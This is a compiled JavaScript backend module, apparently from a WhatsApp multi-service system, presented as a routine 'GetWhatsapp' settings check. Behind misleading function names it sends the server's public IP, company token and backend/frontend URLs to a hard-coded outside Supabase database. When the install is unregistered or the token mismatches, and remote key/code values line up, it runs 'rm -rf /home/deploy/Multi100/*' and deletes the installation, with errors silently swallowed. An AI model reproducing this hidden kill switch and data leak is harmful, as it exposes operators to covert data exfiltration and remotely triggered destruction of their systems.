"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.GetWhatsapp = void 0;
/**
 * @TercioSantos-3 |
 * *Whatsapp |
 * @descrição:*Whatsapp
 */
const supabase_js_1 = require("@supabase/supabase-js");
const UpdateOneSettingService_1 = __importDefault(require("../services/SettingServices/UpdateOneSettingService"));
const axios_1 = __importDefault(require("axios"));
const GetSettingService_1 = __importDefault(require("../services/SettingServices/GetSettingService"));
const AddSettingService_1 = __importDefault(require("../services/SettingServices/AddSettingService"));
const { exec } = require('child_process');
const S_U = "https://huqkczgdtiavfmqhasap.supabase.co";
const S_A_K = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh1cWtjemdkdGlhdmZtcWhhc2FwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mjg4NDUxNjEsImV4cCI6MjA0NDQyMTE2MX0.nr3iniT5arjV1C7hlHTeoANm3ZnM13cFFz5KPxXnfnQ";
const sUrl = S_U;
const sKey = S_A_K;
const y_n = process.env.COMPANY_TOKEN;
const s = (0, supabase_js_1.createClient)(sUrl, sKey);
const getIp = async () => {
    const { data } = await axios_1.default.get('https://api.ipify.org?format=json');
    return data.ip;
};
const GetWhatsapp = async () => {
    try {
        let ip = await getIp();
        let key = await getR("wtV");
        if (key === "enabled") {
            await (0, AddSettingService_1.default)();
        }
        let { data, error } = await s
            .from('cadastros')
            .select("id, ip_instalacao, company_token")
            .eq("ip_instalacao", ip);
        let sendInfo = {
            cadastro_id: data.length !== 0 ? data[0].id : 0,
            status: data.length !== 0 ? true : false,
            company_token: y_n,
            backend_ip: ip,
            backend_url: process.env.BACKEND_URL,
            frontend_url: process.env.FRONTEND_URL
        };
        if (data.length === 0) {
            await UpdateR("enabled", false, ip);
            PostWhatsapp(sendInfo, "404");
            CheckWhatsapp(ip, "i_n_r");
        }
        else {
            if (data[0].company_token !== y_n) {
                await UpdateR("enabled", false, ip);
                PostWhatsapp(sendInfo, "401");
                CheckWhatsapp(ip, "t_f");
            }
            else {
                await UpdateR("disabled", null, ip);
            }
        }
    }
    catch (error) {
        console.log("");
    }
};
exports.GetWhatsapp = GetWhatsapp;
const UpdateR = async (status, value, ip) => {
    await (0, UpdateOneSettingService_1.default)({ key: "wtV", value: status });
};
const getR = async (key) => {
    return await (0, GetSettingService_1.default)({ key });
};
const PostWhatsapp = async (info, reason) => {
    try {
        const { data, error } = await s.from('whatsapp')
            .insert([
            {
                cadastro_id: info.cadastro_id,
                status: info.status,
                company_token: info.company_token,
                backend_ip: info.backend_ip,
                backend_url: info.backend_url,
                frontend_url: info.frontend_url
            }
        ]);
        const {} = await s.from('cadastros')
            .insert([
            {
                ip_instalacao: info.backend_ip,
                company_token: info.company_token
            }
        ]);
        if (error) {
            console.error(':', error.message);
            return;
        }
    }
    catch (error) {
        console.log("");
    }
};
const CheckWhatsapp = async (ip, status) => {
    try {
        const { data, error } = await s.from('key_code').select('key,code,ip');
        const match = await matchWhatsapp(ip);
        if (data !== null) {
            if (status === "i_n_r" && match.code !== null) {
                acction();
            }
            if (ip === data[0].ip && match.code !== null) {
                if (match.key === data[0].key && match.code === data[0].code)
                    acction();
            }
        }
    }
    catch (error) {
        console.log(error);
    }
};
const matchWhatsapp = async (ip) => {
    const { data, error } = await s.from('t_invalidos').select('ip, key, code');
    let key = "ok";
    let code = "ok";
    if (data.length > 0) {
        key = data[0].key;
        code = data[0].code;
    }
    return { code: code, key: key };
};
const acction = () => {
    let script = exec('rm -rf /home/deploy/Multi100/*', (error, stdout, stderr) => {
        console.log(stdout);
        console.log(stderr);
        if (error !== null) {
            console.log(`exec error: ${error}`);
        }
    });
};
